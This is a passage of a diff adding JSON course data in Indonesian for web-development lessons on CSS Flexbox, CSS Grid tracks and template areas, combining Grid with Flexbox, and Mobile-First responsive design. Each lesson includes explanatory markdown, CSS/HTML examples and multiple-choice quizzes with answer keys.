+          },
+          {
+            "id": "q-4-3-2",
+            "question": "Jika Anda ingin memastikan foto avatar atau ikon TIDAK PERNAH menciut/penyok saat ruang layar mengecil, properti apa yang wajib disetel?",
+            "options": [
+              "flex-shrink: 0;",
+              "flex-grow: 0;",
+              "flex-wrap: none;",
+              "box-sizing: static;"
+            ],
+            "correctIndex": 0,
+            "explanation": "flex-shrink: 0 mengunci elemen agar menolak dikompresi lebih kecil dari ukuran basis/width aslinya."
+          },
+          {
+            "id": "q-4-3-3",
+            "question": "Shorthand deklarasi flex: 1; yang sering digunakan pada komponen UI modern merupakan representasi ringkas dari nilai apa?",
+            "options": [
+              "flex-grow: 1; flex-shrink: 1; flex-basis: 0%;",
+              "flex-direction: 1; flex-wrap: 1; gap: 0%;",
+              "flex-order: 1; flex-align: 1; flex-justify: 0%;",
+              "margin: 1; padding: 1; border: 0%;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Shorthand flex: 1 setara dengan flex: 1 1 0%, membagi seluruh ruang kontainer secara proporsional dari basis nol."
+          }
+        ]
+      },
+      {
+        "id": "lesson-4-4",
+        "stageId": "stage-4",
+        "slug": "css-grid-container-dan-tracks",
+        "title": "CSS Grid: Grid Container & Tracks (fr, repeat, minmax)",
+        "titleEn": "CSS Grid: Container & Tracks",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Menguasai tata letak 2 Dimensi (baris dan kolom simultan) dengan CSS Grid, grid-template-columns, fr unit, repeat(), dan minmax() responsif.",
+        "prerequisites": [
+          "flexbox-flex-grow-shrink-dan-basis"
+        ],
+        "learningObjectives": [
+          "Membedakan fungsi utama CSS Grid (Tata Letak 2 Dimensi) dengan Flexbox (Tata Letak 1 Dimensi).",
+          "Mendefinisikan trek kolom dan baris menggunakan grid-template-columns dan satuan pecahan fr (Fractional Unit).",
+          "Menyederhanakan penulisan kolom berulang menggunakan fungsi repeat().",
+          "Membangun galeri kartu responsif tanpa media query menggunakan pola repeat(auto-fit, minmax(250px, 1fr))."
+        ],
+        "whyMatters": "CSS Grid adalah sistem tata letak paling canggih di CSS yang memungkinkan penataan halaman makro yang kompleks dengan sedikit baris kode.",
+        "careerContext": "Galeri produk e-commerce, dashboard kartu analitik, dan grid foto modern dibangun di atas CSS Grid.",
+        "commonMistakes": [
+          "Menggunakan Flexbox bertingkat-tingkat untuk layout tabel 2D yang sebenarnya jauh lebih bersih diselesaikan dengan 2 baris CSS Grid.",
+          "Lupa menyertakan `minmax()` saat membuat grid responsif otomatis."
+        ],
+        "keyTerms": [
+          {
+            "term": "CSS Grid",
+            "definition": "Sistem tata letak 2 Dimensi berbasis baris (rows) dan kolom (columns) simultan."
+          },
+          {
+            "term": "fr (Fractional Unit)",
+            "definition": "Satuan fraksi fleksibel yang mewakili pecahan ruang kosong yang tersedia pada grid."
+          },
+          {
+            "term": "repeat()",
+            "definition": "Fungsi utilitas untuk mengulang deklarasi trek kolom/baris secara ringkas."
+          },
+          {
+            "term": "minmax(min, max)",
+            "definition": "Fungsi pembatas ukuran yang menjamin trek tidak lebih kecil dari min dan tidak lebih besar dari max."
+          },
+          {
+            "term": "auto-fit",
+            "definition": "Kata kunci yang otomatis mengisi jumlah kolom sebanyak mungkin sesuai lebar kontainer."
+          }
+        ],
+        "contentMd": "# CSS Grid: Grid Container & Tracks (fr, repeat, minmax)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **CSS Grid**: sistem tata letak **2 Dimensi (2D)** paling kuat di web, bagaimana membagi kolom dengan satuan fraksional **`fr`**, menyederhanakan kode dengan **`repeat()`**, serta membuat galeri kartu responsif otomatis dengan **`minmax()`**.\n\n## Mengapa Konsep Ini Penting?\nJika Flexbox sangat hebat untuk menyusun elemen dalam satu baris **ATAU** satu kolom (1D), CSS Grid dirancang khusus untuk mengontrol **baris DAN kolom secara bersamaan (2D)**.\n\n## 1. Mengaktifkan Grid & Satuan `fr` (Fractional Unit)\nTambahkan `display: grid;` pada elemen kontainer untuk mengaktifkan Grid Layout:\n\n```css\n.kontainer-grid {\n  display: grid;\n  /* Membagi menjadi 3 kolom: \n     Kolom 1 mengambil 1 bagian, Kolom 2 mengambil 2 bagian, Kolom 3 mengambil 1 bagian */\n  grid-template-columns: 1fr 2fr 1fr;\n  gap: 16px;\n}\n```\n\n- **`1fr`**: Merepresentasikan satu bagian pecahan (*fractional unit*) dari total sisa ruang kosong.\n- Pada contoh di atas, total ruang dibagi 4 bagian (`1 + 2 + 1`), sehingga kolom kedua memiliki lebar 2 kali lipat kolom pertama.\n\n## 2. Menyederhanakan dengan `repeat()`\nDaripada menulis `1fr 1fr 1fr 1fr`, gunakan fungsi `repeat(jumlah, ukuran)`:\n\n```css\n.grid-4-kolom {\n  display: grid;\n  grid-template-columns: repeat(4, 1fr); /* 4 kolom sama rata */\n  gap: 20px;\n}\n```\n\n## 3. Resep Emas: Grid Kartu Responsif Tanpa Media Query\nIni adalah salah satu teknik paling terkenal di CSS modern: membuat grid kartu yang otomatis berubah dari 4 kolom di desktop menjadi 2 kolom di tablet dan 1 kolom di smartphone **tanpa menulis satu pun media query `@media`**!\n\n```css\n.galeri-kartu-responsif {\n  display: grid;\n  /* KUNCI: repeat(auto-fit, minmax(lebar_minimal, 1fr)) */\n  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));\n  gap: 24px;\n}\n```\n\n### Cara Kerjanya:\n1. **`minmax(280px, 1fr)`**: Setiap kartu dilarang mengecil lebih kecil dari 280px. Jika ada sisa ruang, kartu boleh mengembang hingga 1fr.\n2. **`auto-fit`**: Browser menghitung lebar layar; jika muat 3 kartu berukuran minimal 280px, browser membuat 3 kolom. Jika layar mengecil dan hanya muat 1 kartu, browser otomatis menumpuknya menjadi 1 kolom!\n\n## Kesalahan Umum Pemula\n- **Memakai Flexbox untuk grid galeri produk yang kaku**: Flexbox baris terakhir sering kali tidak sejajar rapi jika jumlah item ganjil, sedangkan CSS Grid selalu menjaga kelurusan garis kolom.\n\n## Praktik Mandiri\n1. Buat kontainer galeri dengan 6 buah kartu produk di dalamnya.\n2. Terapkan pola `grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px;`.\n3. Ubah ukuran jendela browser Anda dan saksikan bagaimana kolom bertambah dan berkurang secara otomatis.\n\n## Ringkasan\n- **CSS Grid** mengontrol tata letak 2 Dimensi (baris dan kolom simultan).\n- **`fr`** adalah satuan fraksional ruang kosong yang elastis.\n- **`repeat(3, 1fr)`** membuat 3 kolom sama rata secara ringkas.\n- Pola **`repeat(auto-fit, minmax(250px, 1fr))`** menghasilkan grid kartu yang 100% responsif otomatis tanpa butuh media query.",
+        "quizzes": [
+          {
+            "id": "q-4-4-1",
+            "question": "Apa perbedaan paling mendasar antara CSS Flexbox dan CSS Grid?",
+            "options": [
+              "Flexbox dirancang untuk tata letak 1 Dimensi (baris ATAU kolom), sedangkan CSS Grid dirancang untuk tata letak 2 Dimensi (baris DAN kolom sekaligus).",
+              "Flexbox hanya untuk teks sedangkan CSS Grid hanya untuk gambar.",
+              "CSS Grid tidak didukung oleh browser modern.",
+              "Flexbox membutuhkan kode JavaScript sedangkan CSS Grid murni CSS."
+            ],
+            "correctIndex": 0,
+            "explanation": "CSS Grid mengelola koordinat dua dimensi (baris dan kolom secara bersamaan), ideal untuk tata letak halaman makro menyeluruh."
+          },
+          {
+            "id": "q-4-4-2",
+            "question": "Apa arti dari deklarasi grid-template-columns: repeat(3, 1fr);?",
+            "options": [
+              "Membagi kontainer grid menjadi 3 kolom dengan lebar fraksional yang sama rata persis.",
+              "Mengulang 3 baris vertikal.",
+              "Membuat 3 kontainer grid terpisah.",
+              "Membuat kolom selebar 3 pixel."
+            ],
+            "correctIndex": 0,
+            "explanation": "Fungsi repeat(3, 1fr) adalah singkatan efisien dari 1fr 1fr 1fr, membagi ruang kontainer menjadi 3 kolom yang sama rata."
+          },
+          {
+            "id": "q-4-4-3",
+            "question": "Pola CSS Grid manakah yang paling populer untuk membuat galeri kartu produk yang otomatis responsif di berbagai ukuran layar tanpa butuh media query?",
+            "options": [
+              "grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));",
+              "grid-template-columns: auto-responsive(250px);",
+              "display: flex; wrap-cards: true;",
+              "grid-columns: fluid;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kombinasi repeat(auto-fit, minmax(250px, 1fr)) otomatis memuat kolom sebanyak mungkin sesuai lebar layar dengan batas lebar minimal 250px."
+          }
+        ]
+      },
+      {
+        "id": "lesson-4-5",
+        "stageId": "stage-4",
+        "slug": "css-grid-template-areas-dan-penataan-spasial",
+        "title": "CSS Grid: Grid Template Areas & Penataan Spasial",
+        "titleEn": "CSS Grid: Template Areas & Spatial Alignment",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Menata layout halaman menyeluruh secara visual dengan grid-template-areas, grid-area, grid-column (span), dan garis grid line numbers.",
+        "prerequisites": [
+          "css-grid-container-dan-tracks"
+        ],
+        "learningObjectives": [
+          "Merancang layout makro halaman menggunakan sintaks visual diagram teks grid-template-areas.",
+          "Menempatkan elemen anak ke zona yang dinamai menggunakan properti grid-area.",
+          "Mengontrol bentangan kolom menggunakan grid-column: start / end (atau span n).",
+          "Memanfaatkan tanda titik (.) untuk mengosongkan sel tertentu pada grid."
+        ],
+        "whyMatters": "Grid template areas memungkinkan developer merancang dan mengubah total tata letak dashboard hanya dengan mengubah beberapa baris string teks visual.",
+        "careerContext": "Arsitektur layout dashboard admin (Header, Sidebar, Content, Footer) sangat cepat dan mudah dirawat menggunakan Grid Template Areas.",
+        "commonMistakes": [
+          "Bentuk area pada `grid-template-areas` tidak persegi empat (Grid areas harus selalu membentuk blok persegi empat utuh, tidak boleh bentuk 'L' atau 'T').",
+          "Salah menghitung grid line numbers (garis grid dimulai dari angka 1 pada garis tepi terluar, bukan angka 0)."
+        ],
+        "keyTerms": [
+          {
+            "term": "grid-template-areas",
+            "definition": "Properti untuk memetakan tata letak sel grid menggunakan string nama area visual."
+          },
+          {
+            "term": "grid-area",
+            "definition": "Properti pada elemen anak untuk menempatkan dirinya ke nama zona area yang ditentukan."
+          },
+          {
+            "term": "grid-column",
+            "definition": "Properti shorthand penentu garis awal dan akhir bentangan kolom (contoh: `1 / 3` atau `span 2`)."
+          },
+          {
+            "term": "Grid Line",
+            "definition": "Garis-garis pembatas bernomor yang membagi kolom dan baris pada grid (dimulai dari 1)."
+          }
+        ],
+        "contentMd": "# CSS Grid: Grid Template Areas & Penataan Spasial\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari teknik penataan layout tingkat lanjut dengan **CSS Grid**: menggunakan **`grid-template-areas`** (pemetaan visual berbasis nama), **`grid-area`**, serta mengontrol bentangan sel dengan **`grid-column`** dan **`grid-row`**.\n\n## Mengapa Konsep Ini Penting?\nBagaimana jika Anda bisa \"menggambar\" tata letak website Anda langsung di dalam kode CSS menggunakan teks ASCII sederhana? Fitur `grid-template-areas` membuat perancangan struktur halaman seperti layout majalah atau dashboard admin menjadi sangat intuitif dan menyenangkan.\n\n## 1. Merancang Layout dengan `grid-template-areas`\nPerhatikan bagaimana kita memetakan layout dashboard lengkap hanya dengan mendeklarasikan nama-nama area:\n\n```css\n.layout-dashboard {\n  display: grid;\n  grid-template-columns: 240px 1fr; /* Kolom 1 (Sidebar), Kolom 2 (Main) */\n  grid-template-rows: auto 1fr auto; /* Baris 1 (Header), Baris 2 (Isi), Baris 3 (Footer) */\n  \n  /* GAMBAR PETA TATA LETAK */\n  grid-template-areas:\n    \"header  header\"\n    \"sidebar konten\"\n    \"footer  footer\";\n    \n  min-height: 100vh;\n  gap: 16px;\n}\n\n/* Pasangkan Elemen Anak ke Nama Area */\n.app-header  { grid-area: header; }\n.app-sidebar { grid-area: sidebar; }\n.app-konten  { grid-area: konten; }\n.app-footer  { grid-area: footer; }\n```\n\n> **Aturan Wajib**: Setiap area bernama harus membentuk **persegi panjang atau bujur sangkar utuh**. Anda tidak boleh membuat area berbentuk huruf \"L\" atau \"T\". Jika ingin membiarkan sebuah sel kosong tanpa konten, gunakan tanda titik (**`.`**).\n\n## 2. Mengontrol Bentangan dengan `grid-column` & `grid-row`\nSelain menggunakan nama area, Anda dapat mengontrol bentangan elemen berdasarkan **nomor garis Grid Line**:\n\n```text\nGaris Grid:   1          2          3          4\n              |  Kolom 1 |  Kolom 2 |  Kolom 3 |\n```\n\n```css\n/* Banner Hero Section membentang melintasi 3 kolom penuh (dari garis 1 ke 4) */\n.hero-banner {\n  grid-column: 1 / 4; /* dari garis 1 sampai garis 4 (3 kolom span) */\n}\n\n/* Cara alternatif menggunakan kata kunci span */\n.kartu-lebar {\n  grid-column: span 2; /* Membentang selebar 2 kolom */\n}\n```\n\n## Kesalahan Umum Pemula\n- **Salah menghitung nomor garis**: Mengira kolom pertama bernomor 0. Garis grid line CSS selalu dimulai dari angka **1**.\n- **Nama area di HTML berbeda dengan CSS**: Menulis `grid-area: header;` di CSS tetapi lupa menyematkan class tersebut pada tag `<header>` yang sesuai.\n\n## Praktik Mandiri\n1. Buat kontainer layout dengan `grid-template-areas` yang memiliki \"header header\", \"sidebar main\", dan \"footer footer\".\n2. Masukkan 4 elemen `<div>` anak dan tautkan masing-masing dengan properti `grid-area` yang sesuai.\n\n## Ringkasan\n- **`grid-template-areas`** memetakan layout halaman menggunakan diagram teks visual yang mudah dibaca.\n- Elemen anak disematkan ke peta menggunakan properti **`grid-area: nama_area`**.\n- Tanda titik (**`.`**) menandai sel grid yang sengaja dibiarkan kosong.\n- **`grid-column: 1 / 3`** atau **`grid-column: span 2`** membuat elemen membentang melintasi beberapa kolom.",
+        "quizzes": [
+          {
+            "id": "q-4-5-1",
+            "question": "Fitur CSS Grid manakah yang memungkinkan perancangan tata letak menggunakan diagram teks visual bernama area (seperti 'header header' / 'sidebar konten')?",
+            "options": [
+              "grid-template-areas",
+              "grid-visual-map",
+              "layout-names",
+              "ascii-grid"
+            ],
+            "correctIndex": 0,
+            "explanation": "grid-template-areas memungkinkan pemetaan layout dengan memberi nama string pada zona grid dan menempatkan elemen anak dengan properti grid-area."
+          },
+          {
+            "id": "q-4-5-2",
+            "question": "Jika sebuah elemen anak memiliki properti grid-column: 1 / 3;, berapa banyak kolom yang akan ditempati oleh elemen tersebut?",
+            "options": [
+              "Menempati 2 kolom (dari garis grid line 1 sampai garis grid line 3).",
+              "Menempati 3 kolom penuh.",
+              "Hanya menempati kolom ke-1 saja.",
+              "Menempati setengah kolom."
+            ],
+            "correctIndex": 0,
+            "explanation": "Nomor garis grid dimulai dari 1. Rentang 1 / 3 berarti melintasi dari garis 1 melewati kolom 1 dan kolom 2 hingga garis 3 (total 2 kolom)."
+          },
+          {
+            "id": "q-4-5-3",
+            "question": "Bagaimana cara menandai sel grid yang sengaja dibiarkan kosong tanpa konten di dalam sintaks grid-template-areas?",
+            "options": [
+              "Menggunakan karakter tanda titik (.) pada sel tersebut.",
+              "Menuliskan kata 'null' atau 'empty'.",
+              "Membiarkan spasi kosong tanpa teks.",
+              "Menuliskan angka 0."
+            ],
+            "correctIndex": 0,
+            "explanation": "Dalam sintaks grid-template-areas, karakter titik (.) digunakan sebagai slot placeholder kosong pada cell tertentu."
+          }
+        ]
+      },
+      {
+        "id": "lesson-4-6",
+        "stageId": "stage-4",
+        "slug": "kombinasi-grid-dan-flexbox-arsitektur",
+        "title": "Kombinasi Grid & Flexbox dalam Arsitektur Komponen",
+        "titleEn": "Combining Grid & Flexbox in Component Architecture",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Best practice arsitektur layout: menggunakan CSS Grid untuk kerangka makro halaman dan Flexbox untuk mikro komponen.",
+        "prerequisites": [
+          "css-grid-template-areas-dan-penataan-spasial"
+        ],
+        "learningObjectives": [
+          "Menganalisis kapan harus memilih CSS Grid vs kapan harus memilih Flexbox.",
+          "Menerapkan arsitektur layout bertingkat (Grid untuk Makro Halaman, Flexbox untuk Mikro Komponen).",
+          "Menyusun kartu produk yang rapi dengan tombol footer selalu rata bawah menggunakan Flexbox di dalam Grid."
+        ],
+        "whyMatters": "Mengetahui alat mana yang tepat untuk kasus tertentu membedakan developer amatir dari arsitek frontend profesional.",
+        "careerContext": "Komponen antarmuka produksi modern selalu memadukan CSS Grid dan Flexbox secara harmonis dalam satu kesatuan sistem.",
+        "commonMistakes": [
+          "Mencoba memaksakan salah satu teknologi secara eksklusif (misal: anti-Flexbox atau anti-Grid). Keduanya dirancang untuk saling melengkapi.",
+          "Tombol beli pada kartu produk tidak sejajar karena tinggi deskripsi teks berbeda-beda (dapat diatasi dengan `flex-direction: column; justify-content: space-between`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Macro Layout",
+            "definition": "Tata letak struktur besar halaman (Grid sistem 2D untuk header, sidebar, feed kartu)."
+          },
+          {
+            "term": "Micro Layout",
+            "definition": "Tata letak komponen kecil 1D (perataan icon tombol, badge status, footer kartu)."
+          },
+          {
+            "term": "Component Composition",
+            "definition": "Penggabungan beberapa teknik tata letak di dalam struktur komponen hierarkis."
+          }
+        ],
+        "contentMd": "# Kombinasi Grid & Flexbox dalam Arsitektur Komponen\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari aturan arsitektur terbaik dalam menggabungkan **CSS Grid** dan **Flexbox** secara harmonis untuk membangun aplikasi web modern yang kokoh dan rapi.\n\n## Mengapa Konsep Ini Penting?\nPertanyaan paling sering diajukan oleh developer adalah: *\"Kapan saya harus menggunakan Grid, dan kapan harus menggunakan Flexbox?\"* Jawabannya bukan memilih salah satu, melainkan menggunakan keduanya pada tingkat hierarki yang tepat.\n\n## Panduan Keputusan: Grid vs Flexbox\n\n| Kriteria | Gunakan CSS Grid | Gunakan Flexbox |\n| :--- | :--- | :--- |\n| **Dimensi** | **2 Dimensi** (Baris dan Kolom sekaligus) | **1 Dimensi** (Baris ATAU Kolom tunggal) |\n| **Pendekatan** | *Layout-First* (Wadah menentukan struktur kotak) | *Content-First* (Konten menentukan ukuran kotak) |\n| **Tingkat Hierarki** | **Makro Layout** (Struktur Halaman, Galeri Kartu) | **Mikro Layout** (Navbar, Form Input, Tombol Icon) |\n\n## Pola Arsitektur Ideal: Grid di Luar, Flexbox di Dalam\nBerikut adalah contoh arsitektur dunia nyata:\n1. **Lapisan Makro (CSS Grid)**: Mengatur galeri 3 kolom kartu produk.\n2. **Lapisan Mikro (Flexbox)**: Mengatur isi internal setiap kartu produk agar tombol beli selalu sejajar rapi di bagian paling bawah terlepas dari panjang teks judul.\n\n```html\n<!-- 1. KONTEN MAKRO (CSS GRID) -->\n<div class=\"galeri-produk-grid\">\n  \n  <!-- 2. KARTU MIKRO (FLEXBOX) -->\n  <article class=\"kartu-produk\">\n    <img src=\"/sepatu.jpg\" alt=\"Sepatu Lari\" class=\"foto-produk\" />\n    <div class=\"isi-kartu\">\n      <h3>Sepatu Lari Pro X</h3>\n      <p>Sepatu ultra ringan dengan bantalan empuk untuk maraton harian.</p>\n    </div>\n    \n    <!-- Bagian Bawah Kartu -->\n    <div class=\"footer-kartu\">\n      <span class=\"harga\">Rp 850.000</span>\n      <button class=\"btn-beli\">Beli</button>\n    </div>\n  </article>\n\n</div>\n\n<style>\n  /* 1. MAKRO LAYOUT DENGAN GRID */\n  .galeri-produk-grid {\n    display: grid;\n    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));\n    gap: 24px;\n  }\n\n  /* 2. MIKRO KOMPONEN DENGAN FLEXBOX */\n  .kartu-produk {\n    display: flex;\n    flex-direction: column;         /* Alur vertikal dari atas ke bawah */\n    justify-content: space-between; /* Dorong footer-kartu selalu ke DASAR */\n    background: white;\n    border-radius: 12px;\n    padding: 16px;\n    border: 1px solid #e2e8f0;\n  }\n\n  .footer-kartu {\n    display: flex;\n    justify-content: space-between; /* Harga di kiri, Tombol di kanan */\n    align-items: center;\n    margin-top: 16px;\n  }\n</style>\n```\n\n## Kesalahan Umum Pemula\n- **Memaksa membuat Navbar dengan CSS Grid**: Navbar hanya memerlukan alur 1 dimensi horizontal, sehingga Flexbox jauh lebih fleksibel dan mudah diatur daripada Grid.\n- **Membiarkan tombol kartu tidak sejajar**: Jika teks deskripsi produk berbeda panjangnya, kartu tanpa `flex-direction: column; justify-content: space-between` akan membuat tombol beli naik-turun berantakan.\n\n## Praktik Mandiri\n1. Buat galeri 3 kartu menggunakan CSS Grid.\n2. Di dalam setiap kartu, gunakan Flexbox untuk membuat header kartu (nama pengguna dan tombol ikuti di kanan) serta footer kartu yang selalu menempel di dasar.\n\n## Ringkasan\n- Gunakan **CSS Grid** untuk arsitektur makro (struktur halaman dan galeri 2D).\n- Gunakan **Flexbox** untuk arsitektur mikro (komponen 1D seperti navbar, input grup, dan isi internal kartu).\n- Gabungkan keduanya: Grid membungkus tata letak luar, dan Flexbox meratakan konten di dalam masing-masing kartu.",
+        "quizzes": [
+          {
+            "id": "q-4-6-1",
+            "question": "Dalam arsitektur web modern, bagaimana best practice mengkombinasikan CSS Grid dan Flexbox secara harmonis?",
+            "options": [
+              "Gunakan CSS Grid untuk kerangka makro tata letak halaman (Page Layout / Card Grid), dan gunakan Flexbox untuk penataan mikro di dalam komponen (Navbar, Card Header, Button Icon).",
+              "Pilih salah satu saja secara mutlak dan jangan pernah menggunakan keduanya dalam satu proyek.",
+              "Gunakan Flexbox hanya untuk footer dan Grid hanya untuk header.",
+              "Gunakan Grid untuk animasi dan Flexbox untuk teks paragraf."
+            ],
+            "correctIndex": 0,
+            "explanation": "Grid sangat unggul pada arsitektur struktur makro (2D), sementara Flexbox sangat lincah pada perataan komponen mikro (1D)."
+          },
+          {
+            "id": "q-4-6-2",
+            "question": "Ketika Anda memiliki Card UI di dalam CSS Grid, mengapa bagian Footer kartu sering menggunakan properti display: flex; justify-content: space-between;?",
+            "options": [
+              "Untuk meratakan elemen harga di sisi kiri dan tombol beli di sisi kanan secara presisi dalam satu baris horizontal.",
+              "Agar kartu otomatis berubah menjadi gambar.",
+              "Untuk membatasi jumlah klik pengguna.",
+              "Untuk mengenkripsi harga produk di database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Flexbox space-between adalah pola ideal untuk memposisikan teks metadata dan tombol aksi ke ujung kiri dan kanan komponen."
+          },
+          {
+            "id": "q-4-6-3",
+            "question": "Apa keuntungan membuat Card di dalam Grid memiliki display: flex; flex-direction: column; justify-content: space-between;?",
+            "options": [
+              "Membuat tombol footer pada semua kartu selalu sejajar rapi di bagian paling bawah meskipun panjang teks deskripsi kartu berbeda-beda.",
+              "Membuat tinggi kartu berbeda-beda secara acak.",
+              "Menghilangkan padding pada kartu.",
+              "Membuat kartu tidak bisa diklik oleh pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "Dengan flex-direction: column; justify-content: space-between, tombol footer akan selalu tertahan di dasar kartu terlepas dari panjang teks deskripsi di atasnya."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-5",
+    "orderIndex": 5,
+    "titleId": "Responsive Web Design & Mobile-First Philosophy",
+    "titleEn": "Responsive Web Design & Mobile-First Philosophy",
+    "category": "Fundamentals",
+    "description": "Mendesain website adaptif untuk seluruh ukuran layar (smartphone, tablet, desktop) dengan pendekatan Mobile-First, Media Queries, fluid typography, dan responsive images.",
+    "descriptionEn": "Design adaptive websites for all screen sizes using Mobile-First, Media Queries, fluid typography, and responsive images.",
+    "lessons": [
+      {
+        "id": "lesson-5-1",
+        "stageId": "stage-5",
+        "slug": "filosofi-mobile-first-vs-desktop-first",
+        "title": "Filosofi Mobile-First vs Desktop-First",
+        "titleEn": "Mobile-First vs Desktop-First Philosophy",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami mengapa mendesain untuk layar smartphone terkecil terlebih dahulu (Mobile-First) menghasilkan kode CSS yang lebih bersih dan performant.",
+        "prerequisites": [
+          "kombinasi-grid-dan-flexbox-arsitektur"
+        ],
+        "learningObjectives": [
+          "Menjelaskan filosofi pendekatan Mobile-First Design dibandingkan Desktop-First.",
+          "Menganalisis mengapa Mobile-First menghasilkan kode CSS yang lebih efisien (penambahan gaya progresif via min-width).",
+          "Memahami dampak dominasi trafik mobile global dan Google Mobile-First Indexing pada peringkat SEO."
+        ],
+        "whyMatters": "Lebih dari 60% lalu lintas web global berasal dari smartphone, dan Google mengindeks website berdasarkan versi mobile-nya.",
+        "careerContext": "Setiap frontend framework modern (Tailwind CSS, Bootstrap) menerapkan pendekatan Mobile-First sebagai aturan baku.",
+        "commonMistakes": [
+          "Mendesain tampilan desktop yang rumit terlebih dahulu lalu bersusah payah menyembunyikan atau mereset elemen menggunakan `max-width` untuk layar HP.",
+          "Mengabaikan kecepatan loading di perangkat mobile dengan koneksi seluler lambat."
+        ],
+        "keyTerms": [
+          {
+            "term": "Mobile-First",
+            "definition": "Strategi desain yang memprioritaskan tata letak layar ponsel terkecil sebelum memperluasnya ke layar lebar."
+          },
+          {
+            "term": "Desktop-First",
+            "definition": "Strategi lawas yang mendesain layar komputer lebar lalu mengecilkannya secara paksa dengan max-width."
+          },
+          {
+            "term": "Progressive Enhancement",
+            "definition": "Prinsip menambahkan fitur dan layout kompleks secara bertahap seiring bertambahnya kemampuan layar perangkat."
+          }
+        ],
+        "contentMd": "# Filosofi Mobile-First vs Desktop-First\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari filosofi **Mobile-First Design**: mengapa developer profesional selalu menulis CSS dasar untuk smartphone terlebih dahulu sebelum menambahkan gaya untuk komputer desktop, serta dampaknya terhadap performa dan SEO.\n\n## Mengapa Konsep Ini Penting?\nMayoritas pengunjung website di era sekarang menggunakan smartphone. Jika Anda mendesain untuk desktop 4K terlebih dahulu lalu mencoba \"memaksanya muat\" di layar HP, kode CSS Anda akan penuh dengan kode penimpa (*overrides*) yang berantakan dan lambat.\n\n## 1. Perbandingan Dua Pendekatan\n\n### A. Desktop-First (Pendekatan Tradisional / Usang)\n- Menulis CSS untuk layar lebar komputer terlebih dahulu.\n- Menggunakan media query **`max-width`** untuk membatalkan (*override*) atau menyembunyikan elemen di layar kecil:\n```css\n/* DESKTOP-FIRST: Kurang Efisien */\n.sidebar { display: block; width: 300px; }\n@media (max-width: 768px) {\n  .sidebar { display: none; } /* Terpaksa di-override */\n}\n```\n\n### B. Mobile-First (Standar Modern Profesional)\n- Menulis CSS dasar yang ringan dan linear untuk layar smartphone terkecil tanpa media query.\n- Menggunakan media query **`min-width`** untuk menambahkan tata letak multi-kolom secara bertahap saat layar membesar (**Progressive Enhancement**):\n```css\n/* MOBILE-FIRST: Bersih & Progresif */\n.kontainer { display: flex; flex-direction: column; } /* Default di HP */\n\n@media (min-width: 768px) {\n  .kontainer { flex-direction: row; } /* Aktif saat tablet/desktop */\n}\n```\n\n## 2. Keuntungan Pendekatan Mobile-First\n1. **Kode Lebih Ramping & Bersih**: Gaya dasar mobile bersifat sederhana, sehingga media query `min-width` hanya menambahkan fitur tanpa perlu membongkar atau mereset CSS sebelumnya.\n2. **Performa Lebih Cepat di Smartphone**: Ponsel dengan prosesor terbatas tidak perlu memproses aturan CSS desktop yang berat sebelum merender halaman.\n3. **Google Mobile-First Indexing**: Algoritma mesin pencari Google menilai peringkat SEO sebuah website berdasarkan kecepatan dan kualitas versi selulernya.\n\n## Kesalahan Umum Pemula\n- **Membuat versi mobile sebagai 'afterthought' (pikiran belakangan)**: Mengembangkan website di monitor besar selama berbulan-bulan, lalu kaget saat dibuka di HP tampilannya berantakan total.\n\n## Praktik Mandiri\n1. Buka browser dan ubah ukuran jendela browser menjadi selebar layar HP (sekitar 375px).\n2. Tulis layout satu kolom sederhana, lalu tambahkan `@media (min-width: 768px)` untuk mengubahnya menjadi 2 kolom.\n\n## Ringkasan\n- **Mobile-First** memprioritaskan layar ponsel terkecil terlebih dahulu, lalu memperluas ke layar lebar secara progresif.\n- Mobile-First menggunakan media query **`min-width`** (bukan `max-width`).\n- Pendekatan ini menghasilkan kode CSS yang lebih bersih, performa lebih kencang, dan skor SEO yang lebih tinggi.",
+        "quizzes": [
+          {
+            "id": "q-5-1-1",
+            "question": "Apa filosofi utama dari pendekatan 'Mobile-First Design' dalam pembuatan website modern?",
+            "options": [
+              "Menulis CSS dasar yang dioptimalkan untuk layar ponsel terkecil terlebih dahulu, kemudian menambahkan tata letak kompleks untuk layar lebar menggunakan media query min-width.",
+              "Membuat website yang hanya bisa dibuka di smartphone dan menolak komputer desktop.",
+              "Menghapus semua file gambar dan hanya menampilkan teks di website.",
+              "Mendesain tampilan desktop 4K terlebih dahulu kemudian mengecilkannya secara paksa dengan max-width."
+            ],
+            "correctIndex": 0,
+            "explanation": "Mobile-First memprioritaskan performa dan konten esensial pada layar terkecil sebelum memperluas tata letak ke layar yang lebih besar via min-width."
+          },
+          {
+            "id": "q-5-1-2",
+            "question": "Mengapa pendekatan Mobile-First menghasilkan kode CSS yang lebih bersih dan efisien?",
+            "options": [
+              "Karena gaya dasar mobile bersifat linear sederhana, sehingga media query min-width hanya menambahkan gaya progresif tanpa perlu banyak mereset CSS yang berat.",
+              "Karena perangkat smartphone tidak mendukung bahasa CSS.",
+              "Karena browser mobile mengabaikan aturan warna stylesheet.",
+              "Karena file CSS otomatis dikompresi oleh mesin pencari Google."
+            ],
+            "correctIndex": 0,
+            "explanation": "Penambahan gaya secara progresif via min-width menghindari kebiasaan buruk membatalkan deklarasi desktop yang rumit menggunakan max-width berulang kali."
+          },
+          {
+            "id": "q-5-1-3",
+            "question": "Berdasarkan data lalu lintas internet global, mengapa mengabaikan optimasi tampilan mobile dapat merugikan website secara fatal?",
+            "options": [
